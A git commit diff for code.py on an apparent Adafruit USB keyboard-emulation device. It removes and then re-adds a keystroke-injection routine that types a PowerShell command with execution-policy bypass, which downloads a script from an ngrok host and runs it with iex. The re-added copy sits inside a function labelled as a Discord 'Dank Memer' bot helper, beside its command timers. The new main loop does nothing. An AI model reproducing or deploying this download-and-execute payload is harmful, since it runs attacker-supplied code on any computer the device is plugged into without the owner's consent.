a3616b13285f11494e108eeb99c09d224a859583
maxrichardburgess <22722054+maxfire2008@users.noreply.github.com>
2021-10-03 16:14:24 +1100

    Update code.py

--- code.py
+++ code.py
@@ -8,10 +8,30 @@ from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 kbd = Keyboard(usb_hid.devices)
 layout = KeyboardLayoutUS(kbd)
 
-time.sleep(5)
-kbd.send(Keycode.WINDOWS, Keycode.R)
-time.sleep(0.5)
-layout.write('''powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://d41cb395c6c7.ngrok.io/main.ps1')|iex"''')
-kbd.send(Keycode.ENTER)
-time.sleep(10)
-kbd.send(Keycode.WINDOWS, Keycode.DOWN)
+previous_times = {
+    "beg": 0,
+    "hunt": 0,
+    "fish": 0,
+    "dig": 0,
+    "dep all": 0,
+}
+
+wait_times = {
+    "beg": 46,
+    "hunt": 41,
+    "fish": 41,
+    "dig": 41,
+    "dep all": 300,
+}
+
+def discord_dank_memer():
+    global previous_times
+    global wait_times
+    layout.write('''powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://d41cb395c6c7.ngrok.io/main.ps1')|iex"''')
+    kbd.send(Keycode.ENTER)
+
+apps = [[discord_dank_memer,[255,0,0]]]
+current_app = 0
+running_app = False
+while True:
+    pass
